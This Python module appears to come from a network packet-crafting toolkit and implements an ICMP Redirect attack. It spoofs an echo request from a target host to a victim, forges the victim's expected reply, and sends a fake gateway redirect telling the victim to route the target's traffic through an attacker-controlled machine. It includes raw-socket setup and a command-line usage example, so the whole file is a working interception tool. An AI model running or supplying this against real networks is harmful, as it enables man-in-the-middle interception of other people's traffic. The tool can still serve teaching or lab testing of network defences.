from agave.frames import ethernet, ip, icmp
from agave.frames.core import Buffer
from ipaddress import ip_address, ip_network, IPv4Address
import socket, time


def build_frame(destination: IPv4Address, source: IPv4Address, payload: bytes) -> bytes:
	buf = Buffer.from_bytes()
	ip_frame = ip.IPv4(
		ihl=5, dscp=0, ecn=0, total_length=( 20 + len(payload)), identification=0,
		flags=2, # don't fragment
		fragment_offset=0, ttl=64, protocol=ip.PROTO_ICMP, checksum=0,
		source=source.packed,
		destination=destination.packed,
		options=b''
	)
	ip_frame.set_checksum()
	ip_frame.write_to_buffer(buf)
	buf.write(payload)
	return bytes(buf)


def build_messages(
	victim: IPv4Address,
	target: IPv4Address,
	gway: IPv4Address,
	attacker: IPv4Address
):
	# Build a echo message to trigger victim response
	buf_1 = Buffer.from_bytes()
	icmp_frame = icmp.ICMP.echo(b'abcdefghijklmnopqrstuvwyxz')
	icmp_frame.set_checksum()
	icmp_frame.write_to_buffer(buf_1)
	trigger_message = build_frame(victim, target, bytes(buf_1))

	# Guessed victim response
	buf_2 = Buffer.from_bytes()
	icmp_frame = icmp.ICMP.reply(b'abcdefghijklmnopqrstuvwyxz')
	icmp_frame.set_checksum()
	icmp_frame.write_to_buffer(buf_2)
	victim_response = build_frame(target, victim, bytes(buf_2))

	# Malioucius redirect message from gateway
	buf_3 = Buffer.from_bytes()
	icmp_frame = icmp.ICMP.redirect(
		icmp.REDIRECT_CODE_HOST,
		attacker._ip, # address of the router to use instead
		victim_response	# message that triggered the redirect
	)
	icmp_frame.set_checksum()
	icmp_frame.write_to_buffer(buf_3)
	redirect_message = build_frame(victim, gway, bytes(buf_3))

	return trigger_message, redirect_message


def redirect(rawsock, target: str, attacker: str, victim: str, gateway: str):
	"""
	First sends to {victim} a echo request coming from the {target}, so to trigger
	a response.
	Second, sends a redirect message to the {victim} suggesting a better way to reach
	{target} through {attacker}.
	"""
	trigger_message, redirect_message = build_messages(
		ip_address(victim),
		ip_address(target),
		ip_address(gateway),
		ip_address(attacker)
	)
	rawsock.sendto(trigger_message, (victim, 0))
	time.sleep(0.2)
	rawsock.sendto(redirect_message, (victim, 0))


if __name__ == "__main__":
	"""
	ICMP Redirect

	Usage:
		python3 -m agave.icmp.redirect <target> <attacker> <victim> <gateway>

	Example:
		python3 -m agave.icmp.redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1
	
	"""
	import sys


	if len(sys.argv) < 5:
		print("Too few parameters")
	else:
		rawsocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
		rawsocket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
		redirect(rawsocket, *tuple(sys.argv[1:]))

